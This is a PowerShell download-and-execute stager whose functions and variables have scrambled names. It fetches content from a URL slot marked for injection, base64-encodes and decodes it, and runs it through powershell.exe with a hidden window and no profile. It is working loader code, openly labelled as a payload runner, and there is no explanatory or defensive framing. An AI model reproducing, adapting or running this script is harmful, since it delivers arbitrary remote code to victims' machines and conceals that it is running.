function XhYjVwJtKz {
    param (
        [string]$AaBbCcDdEe
    )

    try {
        Write-Host "[INFO] Fetching payload from: $AaBbCcDdEe"
        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
        Write-Host "[SUCCESS] Payload fetched successfully!"
        return $FfGgHhIiJj.Content
    }
    catch {
        Write-Host "[ERROR] Failed to fetch payload: $_"
        return $null
    }
}

function XoRpQkZtLs {
    param (
        [string]$PpQqRrSsTt
    )

    try {
        Write-Host "[INFO] Decoding payload and executing..."
        $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
        Write-Host "[INFO] Executing payload..."
        powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
        Write-Host "[SUCCESS] Payload executed!"
    }
    catch {
        Write-Host "[ERROR] Failed to execute payload: $_"
    }
}

$QwErTyUuOo = "__PAYLOAD_URL__"  # Placeholder for injection

Write-Host "[INFO] Using payload URL: $QwErTyUuOo"

$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo

if ($VvWwXxYyZz) {
    Write-Host "[INFO] Encoding fetched payload..."
    $ZzYyXxWwVv = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($VvWwXxYyZz))
    XoRpQkZtLs -PpQqRrSsTt $ZzYyXxWwVv
} else {
    Write-Host "[ERROR] No payload fetched. Exiting..."
}

# Keep the console open
Read-Host "Press Enter to exit"
